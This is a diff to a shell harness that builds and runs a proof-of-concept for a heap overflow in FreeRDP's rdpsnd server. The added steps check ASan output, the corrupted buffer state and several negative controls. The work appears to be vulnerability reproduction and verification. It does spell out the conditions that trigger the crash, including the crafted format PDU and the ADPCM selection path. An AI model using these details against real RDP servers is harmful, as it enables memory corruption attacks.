@@ -12,7 +12,9 @@
 # rdpsnd_server_recv_formats() parser with a crafted SNDC_FORMATS PDU;
 # PocRdpsndChannelDispatch additionally drives the real exported
 # rdpsnd_server_handle_messages() framing/dispatcher with a stub WTS read
-# callback. Only loopback-local, source-built code is used; no external probes.
+# callback. PocRdpsndRealWts replaces that stub with FreeRDP's real WTS reader
+# and uses the real shadow Activated callback to select the format; it records
+# the codec-gating precondition. Only source-built loopback-local code is used.
 set -eu
 
 HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
@@ -185,6 +187,73 @@ grep -q 'readback offset 8819=11 offset 8820=de offset 21384=ad' \
     "$WORK/dispatch_adpcm.out" || fail 'dispatch ADPCM plain: markers'
 grep -q '\[dispatch\] mode=adpcm chosen RESULT=PASS' \
     "$WORK/dispatch_adpcm.out" || fail 'dispatch ADPCM plain: result'
+
+
+# Real WTS read path: PocRdpsndRealWts registers FreeRDP's own WtsApi table,
+# so handle_messages() reads from a real wMessageQueue through libfreerdp's
+# FreeRDP_WTSVirtualChannelRead, and the shadow Activated callback selects the
+# format (no manual SelectFormat). Two framed PDUs: PCM, then the malicious
+# record. The queue is fed in-process: no session, network path or auth gate.
+#
+# Codec-gating precondition (measured): server_rdpsnd_get_formats() filters
+# through freerdp_dsp_supports_format(); this build (FFMPEG off) returns only
+# PCM, so real activation rejects both wrap-capable tags. That is the dvi and
+# adpcm negative controls below. The "subsystem" mode supplies an ADPCM server
+# record the way subsystem->rdpsndFormats may, making the same real activation
+# path select the vulnerable client record.
+compile "$HERE/PocRdpsndRealWts.c" \
+    "$WORK/PocRdpsndRealWtsAsan" || fail 'real-WTS PoC ASan compile'
+ASAN_OPTIONS="$ASAN" timeout 60 "$WORK/PocRdpsndRealWtsAsan" subsystem \
+    > "$WORK/realwts_asan_subsystem.out" 2>&1 || true
+grep -q 'server format source: harness-supplied subsystem table' \
+    "$WORK/realwts_asan_subsystem.out" || fail 'real-WTS ASan: format source'
+grep -q 'real server formats: 1 2' "$WORK/realwts_asan_subsystem.out" ||
+    fail 'real-WTS ASan: server formats'
+grep -q 'shadow selected client format 0 rc=12' \
+    "$WORK/realwts_asan_subsystem.out" || fail 'real-WTS ASan: failed realloc'
+grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' \
+    "$WORK/realwts_asan_subsystem.out" || fail 'real-WTS ASan: no overflow'
+grep -q 'WRITE of size 16384' "$WORK/realwts_asan_subsystem.out" ||
+    fail 'real-WTS ASan: wrong write size'
+grep -q '0 bytes after 8820-byte region' "$WORK/realwts_asan_subsystem.out" ||
+    fail 'real-WTS ASan: wrong region size'
+grep -q 'rdpsnd_server_send_samples' "$WORK/realwts_asan_subsystem.out" ||
+    fail 'real-WTS ASan: wrong write frame'
+
+compile_plain "$HERE/PocRdpsndRealWts.c" \
+    "$WORK/PocRdpsndRealWts" || fail 'real-WTS PoC plain compile'
+timeout 60 "$WORK/PocRdpsndRealWts" subsystem \
+    > "$WORK/realwts_subsystem.out" 2>&1 || fail 'real-WTS subsystem PoC failed'
+grep -q 'real-WTS reads rc=0,0,0,0 selected=0 nformats=1 tag=2 ch=2 align=8' \
+    "$WORK/realwts_subsystem.out" || fail 'real-WTS subsystem: dispatch'
+grep -q 'out_buffer_size after PDU1=8820 final out_frames=0xfffffffffffffffc' \
+    "$WORK/realwts_subsystem.out" || fail 'real-WTS subsystem: wrapped state'
+grep -q 'readback offset 8819=11 offset 8820=de offset 21384=ad out_pending_frames=8192' \
+    "$WORK/realwts_subsystem.out" || fail 'real-WTS subsystem: markers'
+grep -q '\[realwts\] mode=subsystem chosen RESULT=PASS' \
+    "$WORK/realwts_subsystem.out" || fail 'real-WTS subsystem: result'
+
+timeout 60 "$WORK/PocRdpsndRealWts" benign \
+    > "$WORK/realwts_benign.out" 2>&1 || fail 'real-WTS benign control failed'
+grep -q 'server format source: real server_rdpsnd_get_formats()' \
+    "$WORK/realwts_benign.out" || fail 'real-WTS benign: format source'
+grep -q 'out_buffer_size after PDU1=8820 final out_frames=0x000000000000089d' \
+    "$WORK/realwts_benign.out" || fail 'real-WTS benign: no wrap'
+grep -q '\[realwts\] mode=benign benign RESULT=PASS' \
+    "$WORK/realwts_benign.out" || fail 'real-WTS benign: result'
+
+for m in dvi adpcm; do
+    timeout 60 "$WORK/PocRdpsndRealWts" "$m" \
+        > "$WORK/realwts_${m}_rejected.out" 2>&1 || true
+    grep -q 'server format source: real server_rdpsnd_get_formats()' \
+        "$WORK/realwts_${m}_rejected.out" || fail "real-WTS $m: format source"
+    grep -q 'real server formats: 1' "$WORK/realwts_${m}_rejected.out" ||
+        fail "real-WTS $m: expected PCM-only list"
+    grep -q '\[activate\] no compatible server format' \
+        "$WORK/realwts_${m}_rejected.out" || fail "real-WTS $m: not rejected"
+    grep -q "\[realwts\] mode=$m chosen RESULT=FAIL" \
+        "$WORK/realwts_${m}_rejected.out" || fail "real-WTS $m: expected negative"
+done
 
 echo 'ALL REAL-LIBRARY CHECKS PASS'
 echo "vulnerable: $WORK/poc.out"
